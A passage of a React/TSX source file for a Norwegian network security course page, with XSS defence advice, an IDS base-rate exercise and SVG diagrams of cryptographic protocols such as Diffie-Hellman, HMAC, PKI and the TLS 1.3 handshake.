              inline. Krever at all egen JS er i eksterne filer eller har en nonce.
            </p>
            <p className="mt-2 text-muted-foreground">
              <strong>Defense in depth:</strong> bruk begge. Escape stopper det meste; CSP er et
              sikkerhetsnett som demper konsekvensene hvis escape glipper et sted i kodebasen. Sett
              også HttpOnly på sesjons-cookies så <code>document.cookie</code> ikke avslører dem til
              JS i utgangspunktet.
            </p>
          </>
        }
      />

      <Exercise
        question="En IDS overvåker 10 Gbps trafikk. Hver pakke har 0.001 % sjanse for å være ondsinnet. Detektoren har 99.5 % sensitivitet (true-positive-rate) og 0.05 % false-positive-rate. Hva er presisjonen av en alarm — altså sannsynligheten for at en alarm faktisk er et angrep? Hva forteller resultatet om driftspraksis?"
        hint="Bayes' setning. Beregn først forventet antall pakker av hver type per sekund."
        answer={
          <>
            <p>Anta gjennomsnittlig pakke-størrelse 1000 bit → 10^7 pakker/sek på 10 Gbps.</p>
            <ul className="list-disc pl-5 mt-1 space-y-1">
              <li>Ondsinnede pakker: 10^7 × 0.00001 = 100/sek</li>
              <li>Godartede pakker: 10^7 × 0.99999 ≈ 10^7/sek</li>
              <li>True positives: 100 × 0.995 = 99.5/sek</li>
              <li>False positives: 10^7 × 0.0005 = 5000/sek</li>
              <li>Totale alarmer: 5099.5/sek</li>
            </ul>
            <p className="mt-2">
              Presisjon = TP / (TP + FP) = 99.5 / 5099.5 ≈ <strong>1.95 %</strong>. Bare ca. 2 av
              hundre alarmer er ekte angrep. Operatøren drukner i støy.
            </p>
            <p className="mt-2 text-muted-foreground">
              <strong>Driftspraksis:</strong> (1) Reduser FPR ved å tune regler aggressivt — selv en
              halvering av FPR til 0.025 % dobler presisjonen. (2) Korreler over flere kilder
              (SIEM): «alarm fra IDS + uvanlig DNS-oppslag fra samme host + login fra ukjent land»
              har mye høyere posterior. (3) Bruk EDR for å hente kontekst per host. (4) Aksepter at
              ren signatur-IDS på rå pakke-strøm har en gulvgrense — derfor er moderne SOC-er bygd
              på korrelering, ikke enkelt-alarmer.
            </p>
          </>
        }
      />
    </article>
  );
}

// ============================================================
// Felles
// ============================================================

function Header({ num, title }: { num: string; title: string }) {
  return (
    <div>
      <div className="text-[10px] uppercase tracking-wider text-brand font-semibold">
        Seksjon {num}
      </div>
      <h2 className="text-lg font-semibold">{title}</h2>
    </div>
  );
}

function Defs({ items }: { items: { term: string; body: React.ReactNode }[] }) {
  return (
    <div className="rounded-xl border border-border bg-card p-4">
      <h3 className="text-xs uppercase tracking-wider text-muted-foreground mb-3">Definisjoner</h3>
      <dl className="space-y-3 text-[13px]">
        {items.map((it) => (
          <div key={it.term}>
            <dt className="font-semibold text-foreground">{it.term}</dt>
            <dd className="text-muted-foreground mt-0.5">{it.body}</dd>
          </div>
        ))}
      </dl>
    </div>
  );
}

function Illustration({ caption, children }: { caption: string; children: React.ReactNode }) {
  return (
    <figure className="rounded-xl border border-border bg-card p-4">
      <div className="rounded bg-muted/20 p-3">{children}</div>
      <figcaption className="text-xs text-muted-foreground mt-2 text-center italic">
        {caption}
      </figcaption>
    </figure>
  );
}

function Example({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-amber-500/30 bg-amber-500/5 p-4">
      <div className="text-[10px] uppercase tracking-wider text-amber-700 dark:text-amber-400 font-semibold mb-1">
        Eksempel
      </div>
      <div className="font-semibold text-foreground mb-1">{title}</div>
      <div className="text-muted-foreground text-[13px] space-y-2">{children}</div>
    </div>
  );
}

function Exercise({
  question,
  hint,
  answer,
}: {
  question: React.ReactNode;
  hint?: React.ReactNode;
  answer?: React.ReactNode;
}) {
  const [showHint, setShowHint] = useState(false);
  const [showAnswer, setShowAnswer] = useState(false);
  return (
    <div className="rounded-xl border border-brand/30 bg-brand/5 p-4">
      <div className="text-[10px] uppercase tracking-wider text-brand font-semibold mb-1">
        Oppgave
      </div>
      <div className="text-[13px]">{question}</div>
      <div className="mt-2 flex gap-2 flex-wrap">
        {hint && (
          <button
            onClick={() => setShowHint((v) => !v)}
            className="inline-flex items-center gap-1 text-[11px] text-muted-foreground hover:text-foreground"
          >
            {showHint ? <ChevronDown className="h-3 w-3" /> : <ChevronRight className="h-3 w-3" />}
            Hint
          </button>
        )}
        {answer && (
          <button
            onClick={() => setShowAnswer((v) => !v)}
            className="inline-flex items-center gap-1 text-[11px] text-muted-foreground hover:text-foreground"
          >
            {showAnswer ? (
              <ChevronDown className="h-3 w-3" />
            ) : (
              <ChevronRight className="h-3 w-3" />
            )}
            {showAnswer ? "Skjul svar" : "Vis svar"}
          </button>
        )}
      </div>
      {showHint && hint && (
        <div className="mt-2 rounded border border-border bg-background p-2 text-[12px] text-muted-foreground">
          {hint}
        </div>
      )}
      {showAnswer && answer && (
        <div className="mt-2 rounded border border-success/30 bg-success/5 p-2 text-[12px]">
          {answer}
        </div>
      )}
    </div>
  );
}

function Hvorfor({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-sky-500/30 bg-sky-500/5 p-4">
      <div className="text-[10px] uppercase tracking-wider text-sky-700 dark:text-sky-400 font-semibold mb-1">
        Hvorfor?
      </div>
      <div className="font-semibold text-foreground mb-1">{title}</div>
      <div className="text-muted-foreground text-[13px] space-y-2">{children}</div>
    </div>
  );
}

function Metafor({ tittel, children }: { tittel: string; children: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-purple-500/30 bg-purple-500/5 p-4">
      <div className="text-[10px] uppercase tracking-wider text-purple-700 dark:text-purple-400 font-semibold mb-1">
        🔮 Metafor
      </div>
      <div className="font-semibold text-foreground mb-1">{tittel}</div>
      <div className="text-muted-foreground text-[13px] space-y-2">{children}</div>
    </div>
  );
}

function RelatedSlugs({ slugs }: { slugs: string[] }) {
  return (
    <div className="rounded-xl border border-border bg-card p-3">
      <div className="text-[10px] uppercase tracking-wider text-muted-foreground mb-2">
        Interaktive utdypninger
      </div>
      <ul className="space-y-1 text-xs">
        {slugs.map((s) => (
          <li key={s}>
            <a
              href={`/stack/${s}`}
              className="inline-flex items-center gap-1 text-muted-foreground hover:text-brand"
            >
              <ExternalLink className="h-3 w-3" /> /stack/{s}
            </a>
          </li>
        ))}
      </ul>
    </div>
  );
}

// ============================================================
// SVG-illustrasjoner — alle original-tegnet
// ============================================================

function FourGoalsSvg() {
  const goals = [
    { x: 80, label: "Konfidensialitet", sub: "Bare A og B leser", color: "fill-brand" },
    { x: 200, label: "Integritet", sub: "Ingen endring", color: "fill-success" },
    { x: 320, label: "Autentisering", sub: "Du er den du sier", color: "fill-amber-500" },
    { x: 440, label: "Tilgjengelighet", sub: "Tjenesten lever", color: "fill-destructive" },
  ];
  return (
    <svg viewBox="0 0 520 200" className="w-full h-auto">
      <text
        x={260}
        y={20}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Fire mål for sikker kommunikasjon
      </text>
      {goals.map((g) => (
        <g key={g.label}>
          <circle
            cx={g.x}
            cy={90}
            r={36}
            className={`${g.color}/20 stroke-current`}
            strokeWidth={1.5}
          />
          <circle cx={g.x} cy={90} r={8} className={g.color} />
          <text
            x={g.x}
            y={150}
            textAnchor="middle"
            className="fill-foreground text-[10px] font-semibold"
          >
            {g.label}
          </text>
          <text x={g.x} y={165} textAnchor="middle" className="fill-muted-foreground text-[8px]">
            {g.sub}
          </text>
        </g>
      ))}
      <text x={260} y={190} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Hvert mål krever en egen mekanisme — ingen verktøy dekker alle fire
      </text>
    </svg>
  );
}

function SymVsAsymSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      {/* Sym */}
      <text
        x={130}
        y={18}
        textAnchor="middle"
        className="fill-brand text-[11px] uppercase tracking-wider font-semibold"
      >
        Symmetrisk
      </text>
      <circle cx={50} cy={70} r={14} className="fill-amber-500" />
      <text x={50} y={75} textAnchor="middle" className="fill-foreground text-[10px]">
        A
      </text>
      <circle cx={210} cy={70} r={14} className="fill-success" />
      <text x={210} y={75} textAnchor="middle" className="fill-foreground text-[10px]">
        B
      </text>
      <rect x={40} y={100} width={20} height={14} rx={2} className="fill-brand" />
      <rect x={200} y={100} width={20} height={14} rx={2} className="fill-brand" />
      <text x={50} y={130} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        K
      </text>
      <text x={210} y={130} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        K (samme)
      </text>
      <line
        x1={64}
        y1={70}
        x2={196}
        y2={70}
        className="stroke-foreground/40"
        strokeWidth={1.5}
        strokeDasharray="2 2"
      />
      <rect
        x={115}
        y={55}
        width={30}
        height={20}
        className="fill-brand/40 stroke-brand"
        strokeWidth={1}
      />
      <text x={130} y={68} textAnchor="middle" className="fill-foreground text-[8px]">
        cipher
      </text>
      <text x={130} y={155} textAnchor="middle" className="fill-foreground text-[9px]">
        E(K, m) = c
      </text>
      <text x={130} y={170} textAnchor="middle" className="fill-foreground text-[9px]">
        D(K, c) = m
      </text>
      <text x={130} y={195} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Problem: hvordan dele K trygt?
      </text>

      {/* Asym */}
      <line x1={270} y1={20} x2={270} y2={230} className="stroke-border" strokeWidth={1} />
      <text
        x={400}
        y={18}
        textAnchor="middle"
        className="fill-success text-[11px] uppercase tracking-wider font-semibold"
      >
        Asymmetrisk
      </text>
      <circle cx={320} cy={70} r={14} className="fill-amber-500" />
      <text x={320} y={75} textAnchor="middle" className="fill-foreground text-[10px]">
        A
      </text>
      <circle cx={480} cy={70} r={14} className="fill-success" />
      <text x={480} y={75} textAnchor="middle" className="fill-foreground text-[10px]">
        B
      </text>
      <rect x={465} y={100} width={12} height={14} rx={1} className="fill-success" />
      <rect x={480} y={100} width={12} height={14} rx={1} className="fill-destructive" />
      <text x={471} y={130} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        pubB
      </text>
      <text x={486} y={130} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        privB
      </text>
      <rect x={314} y={100} width={12} height={14} rx={1} className="fill-success" />
      <text x={320} y={130} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        pubB
      </text>
      <line
        x1={334}
        y1={70}
        x2={466}
        y2={70}
        className="stroke-foreground/40"
        strokeWidth={1.5}
        strokeDasharray="2 2"
      />
      <rect
        x={385}
        y={55}
        width={30}
        height={20}
        className="fill-success/40 stroke-success"
        strokeWidth={1}
      />
      <text x={400} y={68} textAnchor="middle" className="fill-foreground text-[8px]">
        cipher
      </text>
      <text x={400} y={155} textAnchor="middle" className="fill-foreground text-[9px]">
        E(pubB, m) = c
      </text>
      <text x={400} y={170} textAnchor="middle" className="fill-foreground text-[9px]">
        D(privB, c) = m
      </text>
      <text x={400} y={195} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Trygt — pubB er fritt tilgjengelig
      </text>
    </svg>
  );
}

function DhSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Diffie-Hellman nøkkelutveksling
      </text>
      <circle cx={60} cy={60} r={16} className="fill-amber-500" />
      <text x={60} y={65} textAnchor="middle" className="fill-foreground text-[10px]">
        A
      </text>
      <circle cx={460} cy={60} r={16} className="fill-success" />
      <text x={460} y={65} textAnchor="middle" className="fill-foreground text-[10px]">
        B
      </text>

      <text x={60} y={95} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        privat: a
      </text>
      <text x={60} y={108} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        A = g^a mod p
      </text>

      <text x={460} y={95} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        privat: b
      </text>
      <text x={460} y={108} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        B = g^b mod p
      </text>

      <line
        x1={80}
        y1={130}
        x2={440}
        y2={130}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#arr1)"
      />
      <text x={260} y={125} textAnchor="middle" className="fill-foreground text-[10px]">
        sender A (offentlig)
      </text>
      <line
        x1={440}
        y1={155}
        x2={80}
        y2={155}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#arr1)"
      />
      <text x={260} y={170} textAnchor="middle" className="fill-foreground text-[10px]">
        sender B (offentlig)
      </text>

      <defs>
        <marker id="arr1" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-brand" />
        </marker>
      </defs>

      <rect
        x={20}
        y={185}
        width={150}
        height={40}
        rx={4}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={95} y={200} textAnchor="middle" className="fill-foreground text-[9px]">
        A regner: s = B^a mod p
      </text>
      <text x={95} y={215} textAnchor="middle" className="fill-foreground text-[9px] font-mono">
        = g^(ab) mod p
      </text>

      <rect
        x={350}
        y={185}
        width={150}
        height={40}
        rx={4}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={425} y={200} textAnchor="middle" className="fill-foreground text-[9px]">
        B regner: s = A^b mod p
      </text>
      <text x={425} y={215} textAnchor="middle" className="fill-foreground text-[9px] font-mono">
        = g^(ab) mod p
      </text>

      <text x={260} y={205} textAnchor="middle" className="fill-success text-[11px] font-semibold">
        =
      </text>
      <text x={260} y={222} textAnchor="middle" className="fill-muted-foreground text-[8px] italic">
        delt hemmelighet s
      </text>
    </svg>
  );
}

function HashSvg() {
  return (
    <svg viewBox="0 0 520 200" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Hash-funksjon — vilkårlig inn, fast ut
      </text>
      {/* Inputs */}
      <rect
        x={20}
        y={40}
        width={140}
        height={20}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1}
      />
      <text x={90} y={54} textAnchor="middle" className="fill-foreground text-[9px]">
        "Hei verden"
      </text>
      <rect
        x={20}
        y={75}
        width={200}
        height={20}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1}
      />
      <text x={120} y={89} textAnchor="middle" className="fill-foreground text-[9px]">
        "Lang melding med mye tekst..."
      </text>
      <rect
        x={20}
        y={110}
        width={100}
        height={20}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1}
      />
      <text x={70} y={124} textAnchor="middle" className="fill-foreground text-[9px]">
        "Hei verdeM"
      </text>
      <text x={130} y={124} className="fill-destructive text-[8px]">
        ← 1 bit endret
      </text>

      {/* Hash box */}
      <rect
        x={235}
        y={60}
        width={70}
        height={70}
        rx={5}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={2}
      />
      <text
        x={270}
        y={92}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        SHA-256
      </text>
      <text x={270} y={106} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        h(x)
      </text>

      {/* Arrows */}
      <line
        x1={160}
        y1={50}
        x2={235}
        y2={80}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />
      <line
        x1={220}
        y1={85}
        x2={235}
        y2={92}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />
      <line
        x1={120}
        y1={120}
        x2={235}
        y2={110}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />

      <defs>
        <marker id="harr" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>

      {/* Outputs */}
      <line
        x1={305}
        y1={75}
        x2={355}
        y2={45}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />
      <line
        x1={305}
        y1={95}
        x2={355}
        y2={85}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />
      <line
        x1={305}
        y1={115}
        x2={355}
        y2={125}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#harr)"
      />

      <rect
        x={355}
        y={35}
        width={150}
        height={20}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={430} y={49} textAnchor="middle" className="fill-foreground text-[8px] font-mono">
        a3c1...7e9b
      </text>
      <rect
        x={355}
        y={75}
        width={150}
        height={20}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={430} y={89} textAnchor="middle" className="fill-foreground text-[8px] font-mono">
        9f02...c41a
      </text>
      <rect
        x={355}
        y={115}
        width={150}
        height={20}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={430} y={129} textAnchor="middle" className="fill-foreground text-[8px] font-mono">
        12d8...0e7f
      </text>

      <text x={260} y={170} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Selv 1 bit endret input → helt annerledes hash (avalanche-effekt)
      </text>
    </svg>
  );
}

function HmacSvg() {
  return (
    <svg viewBox="0 0 520 200" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        HMAC — hash kombinert med delt nøkkel
      </text>

      <rect
        x={30}
        y={50}
        width={70}
        height={28}
        rx={3}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1}
      />
      <text x={65} y={68} textAnchor="middle" className="fill-foreground text-[9px]">
        melding m
      </text>

      <rect
        x={30}
        y={95}
        width={70}
        height={28}
        rx={3}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={65} y={113} textAnchor="middle" className="fill-foreground text-[9px]">
        nøkkel K
      </text>

      <line
        x1={100}
        y1={64}
        x2={170}
        y2={85}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#hm)"
      />
      <line
        x1={100}
        y1={109}
        x2={170}
        y2={90}
        className="stroke-foreground/40"
        strokeWidth={1}
        markerEnd="url(#hm)"
      />

      <defs>
        <marker id="hm" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>

      <rect
        x={170}
        y={70}
        width={130}
        height={50}
        rx={5}
        className="fill-success/20 stroke-success"
        strokeWidth={2}
      />
      <text
        x={235}
        y={90}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        HMAC-SHA256
      </text>
      <text x={235} y={105} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        (K ⊕ opad ‖ h(K ⊕ ipad ‖ m))
      </text>

      <line
        x1={300}
        y1={95}
        x2={360}
        y2={95}
        className="stroke-foreground/40"
        strokeWidth={1.5}
        markerEnd="url(#hm)"
      />

      <rect
        x={365}
        y={75}
        width={130}
        height={40}
        rx={5}
        className="fill-card stroke-success/60"
        strokeWidth={1.5}
      />
      <text x={430} y={92} textAnchor="middle" className="fill-foreground text-[9px]">
        tag t
      </text>
      <text x={430} y={106} textAnchor="middle" className="fill-foreground text-[8px] font-mono">
        3f9c...e1d2
      </text>

      <text x={260} y={155} textAnchor="middle" className="fill-foreground text-[10px]">
        Send (m, t). Mottaker med samme K kan regne ut t og sammenligne.
      </text>
      <text x={260} y={172} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Uten K kan Trudy ikke generere gyldig t for et forfalsket m.
      </text>
    </svg>
  );
}

function ChallengeResponseSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Challenge-response med signatur
      </text>
      <circle cx={70} cy={60} r={18} className="fill-amber-500" />
      <text x={70} y={66} textAnchor="middle" className="fill-foreground text-[11px]">
        A
      </text>
      <circle cx={450} cy={60} r={18} className="fill-success" />
      <text x={450} y={66} textAnchor="middle" className="fill-foreground text-[11px]">
        B
      </text>

      <line
        x1={90}
        y1={95}
        x2={430}
        y2={95}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#cr1)"
      />
      <text x={260} y={90} textAnchor="middle" className="fill-foreground text-[10px]">
        «Jeg er Alice»
      </text>

      <line
        x1={430}
        y1={130}
        x2={90}
        y2={130}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#cr1)"
      />
      <text x={260} y={125} textAnchor="middle" className="fill-foreground text-[10px]">
        nonce R (tilfeldig, 128 bit)
      </text>

      <line
        x1={90}
        y1={170}
        x2={430}
        y2={170}
        className="stroke-success"
        strokeWidth={2}
        markerEnd="url(#cr2)"
      />
      <text
        x={260}
        y={165}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        sign(privA, R)
      </text>

      <defs>
        <marker id="cr1" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-brand" />
        </marker>
        <marker id="cr2" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-success" />
        </marker>
      </defs>

      <rect
        x={350}
        y={195}
        width={140}
        height={30}
        rx={4}
        className="fill-success/10 stroke-success"
        strokeWidth={1}
      />
      <text x={420} y={208} textAnchor="middle" className="fill-foreground text-[9px]">
        B verifiserer med pubA
      </text>
      <text x={420} y={220} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        → R passet → det er Alice
      </text>
    </svg>
  );
}

function PkiSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        Tillits-kjede i PKI
      </text>

      <rect
        x={210}
        y={35}
        width={100}
        height={40}
        rx={6}
        className="fill-brand/30 stroke-brand"
        strokeWidth={2}
      />
      <text
        x={260}
        y={52}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        Rot-CA
      </text>
      <text x={260} y={66} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        i nettleser fra fabrikken
      </text>

      <line
        x1={260}
        y1={75}
        x2={150}
        y2={120}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#pk1)"
      />
      <line
        x1={260}
        y1={75}
        x2={370}
        y2={120}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#pk1)"
      />

      <rect
        x={90}
        y={120}
        width={120}
        height={36}
        rx={5}
        className="fill-success/20 stroke-success"
        strokeWidth={1.5}
      />
      <text
        x={150}
        y={135}
        textAnchor="middle"
        className="fill-foreground text-[9px] font-semibold"
      >
        Mellom-CA #1
      </text>
      <text x={150} y={148} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        signert av rot
      </text>

      <rect
        x={310}
        y={120}
        width={120}
        height={36}
        rx={5}
        className="fill-success/20 stroke-success"
        strokeWidth={1.5}
      />
      <text
        x={370}
        y={135}
        textAnchor="middle"
        className="fill-foreground text-[9px] font-semibold"
      >
        Mellom-CA #2
      </text>
      <text x={370} y={148} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        signert av rot
      </text>

      <line
        x1={150}
        y1={156}
        x2={80}
        y2={195}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#pk1)"
      />
      <line
        x1={150}
        y1={156}
        x2={220}
        y2={195}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#pk1)"
      />
      <line
        x1={370}
        y1={156}
        x2={380}
        y2={195}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#pk1)"
      />

      <rect
        x={30}
        y={195}
        width={100}
        height={30}
        rx={4}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={80} y={208} textAnchor="middle" className="fill-foreground text-[9px]">
        vg.no
      </text>
      <text x={80} y={219} textAnchor="middle" className="fill-muted-foreground text-[7px]">
        sertifikat
      </text>

      <rect
        x={170}
        y={195}
        width={100}
        height={30}
        rx={4}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={220} y={208} textAnchor="middle" className="fill-foreground text-[9px]">
        nrk.no
      </text>
      <text x={220} y={219} textAnchor="middle" className="fill-muted-foreground text-[7px]">
        sertifikat
      </text>

      <rect
        x={330}
        y={195}
        width={100}
        height={30}
        rx={4}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={380} y={208} textAnchor="middle" className="fill-foreground text-[9px]">
        uit.no
      </text>
      <text x={380} y={219} textAnchor="middle" className="fill-muted-foreground text-[7px]">
        sertifikat
      </text>

      <defs>
        <marker id="pk1" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-foreground/60" />
        </marker>
      </defs>
    </svg>
  );
}

function TlsHandshakeSvg() {
  return (
    <svg viewBox="0 0 520 320" className="w-full h-auto">
      <text
        x={260}
        y={16}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        TLS 1.3 handshake (1-RTT)
      </text>
      {/* Lifelines */}
      <line x1={90} y1={30} x2={90} y2={310} className="stroke-border" strokeWidth={1} />
      <line x1={430} y1={30} x2={430} y2={310} className="stroke-border" strokeWidth={1} />
      <text x={90} y={42} textAnchor="middle" className="fill-foreground text-[10px] font-semibold">
        Klient
      </text>
      <text
        x={430}
        y={42}
        textAnchor="middle"
        className="fill-foreground text-[10px] font-semibold"
      >
        Server
      </text>

      {/* CH */}
      <line
        x1={90}
        y1={70}
        x2={430}
        y2={85}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#tls)"
      />
      <text x={260} y={68} textAnchor="middle" className="fill-foreground text-[9px]">
        ClientHello
      </text>
      <text x={260} y={80} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        nonce_c, supported_ciphers, ECDHE-share_c
      </text>

      {/* SH */}
      <line
        x1={430}
        y1={115}
        x2={90}
        y2={155}
        className="stroke-success"
        strokeWidth={1.5}
        markerEnd="url(#tls)"
      />
      <text x={260} y={113} textAnchor="middle" className="fill-foreground text-[9px]">
        ServerHello + EncryptedExtensions
      </text>
      <text x={260} y={125} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        nonce_s, valgt_cipher, ECDHE-share_s
      </text>
      <text x={260} y={137} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        Certificate, CertificateVerify (signering)
      </text>
      <text x={260} y={149} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        Finished (MAC over hele handshake-historikk)
      </text>

      {/* Compute master */}
      <rect
        x={20}
        y={170}
        width={140}
        height={36}
        rx={4}
        className="fill-amber-500/10 stroke-amber-500/60"
        strokeWidth={1}
      />
      <text x={90} y={184} textAnchor="middle" className="fill-foreground text-[9px]">
        avled master fra ECDHE
      </text>
      <text x={90} y={197} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        via HKDF
      </text>

      <rect
        x={360}
        y={170}
        width={140}
        height={36}
        rx={4}
        className="fill-amber-500/10 stroke-amber-500/60"
        strokeWidth={1}
      />
      <text x={430} y={184} textAnchor="middle" className="fill-foreground text-[9px]">
        samme master
      </text>
      <text x={430} y={197} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        → trafikk-nøkler
      </text>

      {/* Finished */}
      <line
        x1={90}
        y1={225}
        x2={430}
        y2={235}
        className="stroke-brand"
        strokeWidth={1.5}
        markerEnd="url(#tls)"
      />
      <text x={260} y={223} textAnchor="middle" className="fill-foreground text-[9px]">
        Finished (MAC)
      </text>

      {/* App data */}
      <line
        x1={90}
        y1={265}
        x2={430}
        y2={275}
        className="stroke-success"
        strokeWidth={2}
        markerEnd="url(#tls)"
      />
      <text x={260} y={263} textAnchor="middle" className="fill-success text-[10px] font-semibold">
        Applikasjonsdata (AES-GCM)
      </text>

      <text x={260} y={300} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        ECDHE gir Forward Secrecy — server-nøkkel lekker = bare nye sesjoner i fare
      </text>

      <defs>
        <marker id="tls" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
          <polygon points="0 0, 6 3, 0 6" className="fill-current" />
        </marker>
      </defs>
    </svg>
  );
}

function IpsecTunnelSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        IPsec ESP tunnel-mode
      </text>

      {/* Original packet */}
      <rect
        x={30}
        y={45}
        width={130}
        height={40}
        rx={4}
        className="fill-brand/20 stroke-brand"
        strokeWidth={1}
      />
      <text x={95} y={60} textAnchor="middle" className="fill-foreground text-[9px]">
        10.0.1.5 → 10.0.2.7
      </text>
      <text x={95} y={75} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        IP + TCP/UDP + data
      </text>

      <line
        x1={160}
        y1={65}
        x2={210}
        y2={120}
        className="stroke-foreground/40"
        strokeWidth={1.5}
        markerEnd="url(#ip1)"
      />
      <text x={180} y={92} className="fill-muted-foreground text-[8px]">
        krypter + pakk
      </text>

      {/* Tunnel encapsulated packet */}
      <rect
        x={210}
        y={110}
        width={300}
        height={50}
        rx={4}
        className="fill-success/10 stroke-success"
        strokeWidth={1.5}
      />
      <rect
        x={216}
        y={118}
        width={70}
        height={34}
        className="fill-amber-500/30 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={251} y={132} textAnchor="middle" className="fill-foreground text-[8px]">
        ny IP
      </text>
      <text x={251} y={146} textAnchor="middle" className="fill-muted-foreground text-[7px]">
        .5 → .9
      </text>
      <rect
        x={292}
        y={118}
        width={50}
        height={34}
        className="fill-destructive/30 stroke-destructive"
        strokeWidth={1}
      />
      <text x={317} y={138} textAnchor="middle" className="fill-foreground text-[8px]">
        ESP hdr
      </text>
      <rect
        x={348}
        y={118}
        width={120}
        height={34}
        className="fill-brand/40 stroke-brand"
        strokeWidth={1}
      />
